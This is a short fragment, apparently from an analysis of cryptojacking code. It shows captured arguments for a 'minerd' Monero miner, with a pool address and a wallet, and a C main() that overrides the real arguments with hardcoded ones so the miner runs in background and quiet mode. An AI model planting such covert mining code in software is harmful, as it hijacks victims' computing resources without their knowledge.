...
argv[2] = cryptonight
argv[3] = -o
argv[4] = stratum+tcp://monerohash.com:3333
argv[5] = -u
argv[6] = 47oyMswJzXM4H3pwj5oRNgDP5GTzG8tJqdNHZqQydc3MS29zeqCVwiSjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3eTCxwZ
argv[7] = -p
argv[8] = x
argv[9] = -t
argv[10] = 7
...
int main(int argc, char *argv[]) {
    ...
    char* dummy_args[] = { "./minerd", "-a", "cryptonight", "-o"
                         ...
                         , "-p", "x", "-t", "15", "--background", "--quiet", NULL };	
    argc = 12;
    argv = dummy_args;
